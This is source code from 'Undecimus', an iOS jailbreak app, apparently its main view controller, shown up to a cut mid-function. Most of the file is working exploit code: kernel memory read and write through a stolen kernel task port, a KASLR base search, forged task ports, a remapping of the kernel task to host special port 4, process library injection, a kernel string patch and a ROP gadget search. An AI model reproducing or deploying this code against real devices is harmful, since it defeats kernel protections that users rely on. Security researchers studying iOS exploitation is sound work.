//
//  ViewController.m
//  Undecimus
//
//  Created by pwn20wnd on 8/29/18.
//  Copyright © 2018 Pwn20wnd. All rights reserved.
//

#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <spawn.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#include <sys/mman.h>
#include <sys/param.h>
#import "ViewController.h"
#include "common.h"
#include "offsets.h"
#include "empty_list_sploit.h"
#include "kmem.h"
#include "patchfinder64.h"
#include "kexecute.h"
#include "kutils.h"
#include "libjb.h"
#include "remote_memory.h"
#include "remote_call.h"
#include "QiLin.h"
#include "iokit.h"
#include "unlocknvram.h"
#include "SettingsTableViewController.h"
#include "untar.h"
#include "multi_path_sploit.h"
#include "async_wake.h"
#include "MobileGestalt.h"

@interface ViewController ()

@end

@implementation ViewController
static ViewController *sharedController = nil;

#define PROGRESS(msg, btnenbld, tbenbld) do { \
        dispatch_async(dispatch_get_main_queue(), ^{ \
            [UIView performWithoutAnimation:^{ \
                [[[ViewController sharedController] goButton] setEnabled:btnenbld]; \
                [[[[ViewController sharedController] tabBarController] tabBar] setUserInteractionEnabled:tbenbld]; \
                [[[ViewController sharedController] goButton] setTitle:@(msg) forState: btnenbld ? UIControlStateNormal : UIControlStateDisabled]; \
                [[[ViewController sharedController] goButton] layoutIfNeeded]; \
            }]; \
        }); \
} while (false)

#define CLEAN_FILE(file) do { \
    if (!access(file, F_OK)) { \
        _assert(unlink(file) == 0, message); \
    } \
} while (false)

#define INIT_FILE(file, owner, mode) do { \
        _assert(access(file, F_OK) == 0, message); \
        _assert(chmod(file, mode) == 0, message); \
        _assert(chown(file, owner, owner) == 0, message); \
} while (false)

typedef struct {
    kptr_t trust_chain;
    kptr_t amficache;
    kptr_t OSBoolean_True;
    kptr_t OSBoolean_False;
    kptr_t osunserializexml;
    kptr_t smalloc;
    kptr_t allproc;
    kptr_t add_x0_x0_0x40_ret;
    kptr_t rootvnode;
    kptr_t zone_map_ref;
    kptr_t vfs_context_current;
    kptr_t vnode_lookup;
    kptr_t vnode_put;
    kptr_t kernproc;
    kptr_t v_mount;
    kptr_t mnt_flag;
    kptr_t v_specinfo;
    kptr_t si_flags;
    kptr_t v_flags;
} offsets_t;

const char *empty_list_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    "4570.60.10.0.1~16",
    "4570.60.16~9",
    "4570.60.19~25",
    NULL
};

const char *multi_path_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    NULL
};

const char *async_wake_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    NULL
};

#define ISADDR(val)            (val != HUGE_VAL && val != -HUGE_VAL)
#define ADDRSTRING(val)        [NSString stringWithFormat:@ADDR, val]
#define VSHARED_DYLD           0x000200

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000

#define ptrSize sizeof(uintptr_t)

static void writeTestFile(const char *file) {
    CLEAN_FILE(file);
    FILE *a = fopen(file, "w");
    LOG("a: " "%p" "\n", a);
    _assert(a != NULL, message);
    _assert(fclose(a) == 0, message);
    INIT_FILE(file, 0, 0644);
    _assert(unlink(file) == 0, message);
}

static vm_address_t get_kernel_base(mach_port_t tfp0)
{
    uint64_t addr = 0;
    addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

int sha1_to_str(const unsigned char *hash, int hashlen, char *buf, size_t buflen)
{
    if (buflen < (hashlen*2+1)) {
        return -1;
    }
    
    int i;
    for (i=0; i<hashlen; i++) {
        sprintf(buf+i*2, "%02X", hash[i]);
    }
    buf[i*2] = 0;
    return ERR_SUCCESS;
}

char *copyBootHash(void)
{
    io_registry_entry_t chosen = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/chosen");
    
    if (!MACH_PORT_VALID(chosen)) {
        printf("Unable to get IODeviceTree:/chosen port\n");
        return NULL;
    }
    
    CFDataRef hash = (CFDataRef)IORegistryEntryCreateCFProperty(chosen, CFSTR("boot-manifest-hash"), kCFAllocatorDefault, 0);
    
    IOObjectRelease(chosen);
    
    if (hash == nil) {
        fprintf(stderr, "Unable to read boot-manifest-hash\n");
        return NULL;
    }
    
    if (CFGetTypeID(hash) != CFDataGetTypeID()) {
        fprintf(stderr, "Error hash is not data type\n");
        CFRelease(hash);
        return NULL;
    }
    
    // Make a hex string out of the hash
    
    CFIndex length = CFDataGetLength(hash) * 2 + 1;
    char *manifestHash = (char*)calloc(length, sizeof(char));
    
    int ret = sha1_to_str(CFDataGetBytePtr(hash), (int)CFDataGetLength(hash), manifestHash, length);
    
    CFRelease(hash);
    
    if (ret != ERR_SUCCESS) {
        printf("Unable to generate bootHash string\n");
        free(manifestHash);
        return NULL;
    }
    
    return manifestHash;
}

#define APPLESNAP "com.apple.os.update-"

const char *systemSnapshot()
{
    SETMESSAGE("Failed to find systemSnapshot");
    char *BootHash = copyBootHash();
    _assert(BootHash != NULL, message);
    const char *SystemSnapshot = [[NSString stringWithFormat:@APPLESNAP @"%s", BootHash] UTF8String];
    free(BootHash);
    return SystemSnapshot;
}

uint64_t
find_gadget_candidate(
                      char** alternatives,
                      size_t gadget_length)
{
    void* haystack_start = (void*)atoi;    // will do...
    size_t haystack_size = 100*1024*1024; // likewise...
    
    for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
        void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
        if (found_at != NULL){
            printf("found at: %llx\n", (uint64_t)found_at);
            return (uint64_t)found_at;
        }
    }
    
    return 0;
}

uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = {blr_x19, NULL};
    blr_x19_addr = find_gadget_candidate(candidates, 4);
    return blr_x19_addr;
}

int inject_library(pid_t pid, const char *path)
{
    SETMESSAGE("Failed to inject library.");
    mach_port_t task_port = MACH_PORT_NULL;
    kern_return_t ret = KERN_FAILURE;
    ret = task_for_pid(mach_task_self(), pid, &task_port);
    if (!(MACH_PORT_VALID(task_port) && ret == KERN_SUCCESS))
        task_port = task_for_pid_workaround(pid);
    _assert(MACH_PORT_VALID(task_port), message);
    call_remote(task_port, dlopen, 2, REMOTE_CSTRING(path), REMOTE_LITERAL(RTLD_NOW));
    uint64_t error = call_remote(task_port, dlerror, 0);
    _assert(error == 0, message);
    return 0;
}

size_t
kread(uint64_t where, void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

// thx Siguza
typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    if (zm_hdr.start == 0) {
        // xxx rk64(0) ?!
        // uint64_t zone_map_ref = find_zone_map_ref();
        fprintf(stderr, "zone_map_ref: %llx \n", zone_map_ref);
        uint64_t zone_map = rk64(zone_map_ref);
        fprintf(stderr, "zone_map: %llx \n", zone_map);
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        fprintf(stderr, "zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            fprintf(stderr, "kread of zone_map failed!\n");
            exit(1);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            fprintf(stderr, "zone_map is too big, sorry.\n");
            exit(1);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
    
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

// Stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    // we can use mach_host_self() if we're root
    mach_port_t host_priv = fake_host_priv();
    
    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    
    uint64_t kernel_task_kaddr;
    
    {
        // find kernel task first
        kernel_task_kaddr = rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        
        while (kernel_task_kaddr != 0) {
            uint64_t bsd_info = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
            
            uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
            
            if (pid == 0) {
                break;
            }
            
            kernel_task_kaddr = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
        }
        
        if (kernel_task_kaddr == 0) {
            printf("[remap_kernel_task] failed to find kernel task\n");
            return 1;
        }
        
        printf("[remap_kernel_task] kernel task at 0x%llx\n", kernel_task_kaddr);
    }
    
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    
    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = zone_map_ref;
    uint64_t zone_map = rk64(zone_map_kptr);
    
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = rk64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    
    km_fake_task_port = zm_fake_task_port;
    
    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);
    
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    if (kernel_task_kaddr == remapped_task_addr) {
        printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }
    
    printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
    
    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
    printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
    
    make_port_fake_task_port(*port, remapped_task_addr);
    
    if (rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }
    
    // lck_mtx -- arm: 8  arm64: 16
    const int offsetof_host_special = 0x10;
    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
    uint64_t realhost_kaddr = rk64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    wk64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
    
    return 0;
}

// https://stackoverflow.com/a/47195924
char *readFile(char *filename) {
    FILE *f = fopen(filename, "rt");
    _assert(f, "Failed to read file.");
    fseek(f, 0, SEEK_END);
    long length = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buffer = (char *) malloc(length + 1);
    buffer[length] = '\0';
    fread(buffer, 1, length, f);
    fclose(f);
    return buffer;
}

void blockDomainWithName(char *name) {
    SETMESSAGE("Failed to block domain with name.");
    char *hostsFile = NULL;
    char *newLine = NULL;
    FILE *f = NULL;
    hostsFile = readFile("/etc/hosts");
    _assert(hostsFile != NULL, message);
    newLine = malloc(sizeof(char *) + (14 + sizeof(name)));
    bzero(newLine, sizeof(char *) + (14 + sizeof(name)));
    sprintf(newLine, "\n127.0.0.1 %s\n", name);
    if (strstr(hostsFile, newLine) != NULL) goto out;
    f = fopen("/etc/hosts", "a");
    _assert(f != NULL, message);
    fprintf(f, "%s\n", newLine);
out:
    if (hostsFile != NULL) free(hostsFile);
    if (newLine != NULL) free(newLine);
    if (f != NULL) fclose(f);
}

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define DEFAULT_VERSION_STRING "Hacked"
int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t kernel_base) {
    uintptr_t versionPtr = 0;
    struct utsname u = {0};
    uname(&u);
    
    uintptr_t darwinTextPtr = 0;
    
    char *buf = NULL;
    
    vm_size_t sz;
    uintptr_t TEXT_const = 0;
    uint32_t sizeofTEXT_const = 0;
    uintptr_t DATA_data = 0;
    uint32_t sizeofDATA_data = 0;
    
    char *sectName = "__const";
    
    for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
        int ret = vm_read(tfp0, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            exit(-1);
        }
        
        if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
            TEXT_const = *(uintptr_t*)(buf+0x20);
            sizeofTEXT_const = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
            
        }
        
        else if (!strcmp(buf, "__data") && !strcmp(buf+0x10, "__DATA")) {
            DATA_data = *(uintptr_t*)(buf+0x20);
            sizeofDATA_data = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
        }
        
        if (TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)
            break;
    }
    
    if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
        printf("Error parsing kernel macho\n");
        return -1;
    }
    
    for (uintptr_t i = TEXT_const; i < (TEXT_const+sizeofTEXT_const); i += 2)
    {
        int ret = vm_read_overwrite(tfp0, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
            darwinTextPtr = i;
            break;
        }
    }
    
    if (!darwinTextPtr) {
        printf("Error finding Darwin text\n");
        return -1;
    }
    
    uintptr_t versionTextXref[ptrSize];
    versionTextXref[0] = darwinTextPtr;
    
    for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
        int ret = vm_read_overwrite(tfp0, i, ptrSize, (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        
        if (!memcmp(buf, versionTextXref, ptrSize)) {
            versionPtr = i;
            break;
        }
    }
    
    if (!versionPtr) {
        printf("Error finding _version pointer, did you already patch it?\n");
        return -1;
    }
    
    kern_return_t ret;
    vm_address_t newStringPtr = 0;
    vm_allocate(tfp0, &newStringPtr, strlen(newVersionString), VM_FLAGS_ANYWHERE);
    
    ret = vm_write(tfp0, newStringPtr, (vm_offset_t)newVersionString, (mach_msg_type_number_t)strlen(newVersionString));
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        exit(-1);
    }
    
    ret = vm_write(tfp0, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        return -1;
    }
    else {
        memset(&u, 0x0, sizeof(u));
        uname(&u);
        return 0;
    }
}

// https://stackoverflow.com/a/779960
// You must free the result if result is non-NULL.
char *str_replace(char *orig, char *rep, char *with) {
    char *result; // the return string
    char *ins;    // the next insert point
    char *tmp;    // varies
    int len_rep;  // length of rep (the string to remove)
    int len_with; // length of with (the string to replace rep with)
    int len_front; // distance between rep and end of last rep
    int count;    // number of replacements
    
    // sanity checks and initialization
    if (!orig || !rep)
        return NULL;
    len_rep = (int)strlen(rep);
    if (len_rep == 0)
        return NULL; // empty rep causes infinite loop during count
    if (!with)
        with = "";
    len_with = (int)strlen(with);
    
    // count the number of replacements needed
    ins = orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }
    
    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);
    
    if (!result)
        return NULL;
    
    // first time through the loop, all the variable are set correctly
    // from here on,
    //    tmp points to the end of the result string
    //    ins points to the next occurrence of rep in orig
    //    orig points to the remainder of orig after "end of rep"
    while (count--) {
        ins = strstr(orig, rep);
        len_front = (int)(ins - orig);
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep; // move to next "end of rep"
    }
    strcpy(tmp, orig);
    return result;
}

uint64_t _vfs_context(uint64_t vfs_context_current, uint64_t zone_map_ref) {
    // vfs_context_t vfs_context_current(void)
    uint64_t vfs_context = kexecute(vfs_context_current, 1, 0, 0, 0, 0, 0, 0);
    vfs_context = zm_fix_addr(vfs_context, zone_map_ref);
    return vfs_context;
}

int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(vnode_lookup, ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != 0) {
        return -1;
    }
    *vpp = rk64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode_put, uint64_t vnode){
    return (int)kexecute(vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t getVnodeAtPath(uint64_t vfs_context, const char *path, uint64_t vnode_lookup){
    uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
    int ret = _vnode_lookup(vnode_lookup, path, O_RDONLY, vpp, vfs_context);
    if (ret != 0){
        printf("unable to get vnode from path for %s\n", path);
        free(vpp);
        return -1;
    }
    uint64_t vnode = *vpp;
    free(vpp);
    return vnode;
}

typedef struct val_attrs {
    uint32_t          length;
    attribute_set_t   returned;
    attrreference_t   name_info;
} val_attrs_t;

int snapshot_list(const char *vol)
{
    struct attrlist attr_list = { 0 };
    int total=0;
    
    attr_list.commonattr = ATTR_BULK_REQUIRED;
    
    char *buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    int fd = open(vol, O_RDONLY, 0);
    while ((retcount = fs_snapshot_list(fd, &attr_list, buf, 2048, 0))>0) {
        total += retcount;
        char *bufref = buf;
        
        for (int i=0; i<retcount; i++) {
            val_attrs_t *entry = (val_attrs_t *)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
            }
            bufref += entry->length;
        }
    }
    free(buf);
    close(fd);
    
    if (retcount < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    return total;
}

int snapshot_check(const char *vol, const char *name)
{
    struct attrlist attr_list = { 0 };
    
    attr_list.commonattr = ATTR_BULK_REQUIRED;
    
    char *buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    int fd = open(vol, O_RDONLY, 0);
    while ((retcount = fs_snapshot_list(fd, &attr_list, buf, 2048, 0))>0) {
        char *bufref = buf;
        
        for (int i=0; i<retcount; i++) {
            val_attrs_t *entry = (val_attrs_t *)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
                if (strstr((char*)(&entry->name_info) + entry->name_info.attr_dataoffset, name))
                    return 1;
            }
            bufref += entry->length;
        }
    }
    free(buf);
    close(fd);
    
    if (retcount < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    return 0;
}

int message_size_for_kalloc_size(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

void iosurface_die() {
    kern_return_t err;
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    
    if (service == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return;
    }
    
    printf("got service port\n");
    
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (err != KERN_SUCCESS){
        printf("unable to get user client connection\n");
        return;
    }
    
    printf("got user client: 0x%x\n", conn);
    
    uint64_t inputScalar[16];
    uint64_t inputScalarCnt = 0;
    
    char inputStruct[4096];
    size_t inputStructCnt = 0x18;
    
    
    uint64_t* ivals = (uint64_t*)inputStruct;
    ivals[0] = 1;
    ivals[1] = 2;
    ivals[2] = 3;
    
    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 0;
    
    char outputStruct[4096];
    size_t outputStructCnt = 0;
    
    mach_port_t port = MACH_PORT_NULL;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate new port\n");
        return;
    }
    printf("got wake port 0x%x\n", port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    uint64_t reference[8] = {0};
    uint32_t referenceCnt = 1;
    
    for (int i = 0; i < 10; i++) {
        err = IOConnectCallAsyncMethod(
                                       conn,
                                       17,
                                       port,
                                       reference,
                                       referenceCnt,
                                       inputScalar,
